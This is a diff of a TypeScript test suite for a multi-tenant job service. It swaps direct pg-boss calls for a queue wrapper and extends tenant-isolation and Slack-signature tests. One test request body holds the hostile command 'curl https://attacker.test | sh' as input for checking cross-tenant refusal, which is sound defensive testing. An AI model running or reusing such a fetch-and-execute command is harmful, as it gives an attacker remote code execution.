@@ -37,6 +37,7 @@ import path from "node:path";
 import PgBoss from "pg-boss";
 import pg from "pg";
 import { createApp } from "./app.js";
+import { PgBossQueue } from "./jobs/index.js";
 import { DiskArtifactStore } from "./artifact-store.js";
 import { SecretBox } from "./secrets.js";
 import { createAuth, type AuthHooks } from "./auth.js";
@@ -91,7 +92,7 @@ before(async () => {
     env,
     db,
     pool,
-    boss,
+    jobs: new PgBossQueue(boss),
     bus: new EventBus(),
     drivers: singleDriver(new LocalProcessDriver()),
     worktrees: new WorktreeManager(dataDir),
@@ -110,7 +111,7 @@ before(async () => {
 });
 
 after(async () => {
-  await ctx.boss.stop({ close: true, timeout: 1000 });
+  await ctx.jobs.stop();
   await ctx.pool.end();
 });
 
@@ -1094,6 +1095,7 @@ test("every entity route refuses a foreign tenant", async () => {
     ["PATCH", `/api/swarms/${swarm.id}`, { body: JSON.stringify({ completionCommand: "curl https://attacker.test | sh" }) }],
     ["POST", `/api/swarms/${swarm.id}/start`],
     ["POST", `/api/swarms/${swarm.id}/planner/retry`],
+    ["POST", `/api/swarms/${swarm.id}/publish`],
     ["POST", `/api/swarms/${swarm.id}/planner/stop`],
     ["POST", `/api/swarms/${swarm.id}/pause`],
     ["POST", `/api/swarms/${swarm.id}/cancel`],
@@ -3514,11 +3516,10 @@ test("the Slack webhook demands a valid signature", async () => {
     assert.equal(forgedInteractive.status, 401);
 
     const queued: { name: string; data: unknown }[] = [];
-    const realSend = ctx.boss.send.bind(ctx.boss);
-    ctx.boss.send = (async (name: string, data?: object | null) => {
+    const realSend = ctx.jobs.send.bind(ctx.jobs);
+    ctx.jobs.send = (async (name, data) => {
       queued.push({ name, data });
-      return "job-id";
-    }) as typeof ctx.boss.send;
+    }) as typeof ctx.jobs.send;
     try {
       const payload = JSON.stringify({
         type: "block_actions",
@@ -3587,7 +3588,7 @@ test("the Slack webhook demands a valid signature", async () => {
         },
       }]);
     } finally {
-      ctx.boss.send = realSend;
+      ctx.jobs.send = realSend;
     }
   } finally {
     if (original === undefined) delete mutableEnv.SLACK_SIGNING_SECRET;
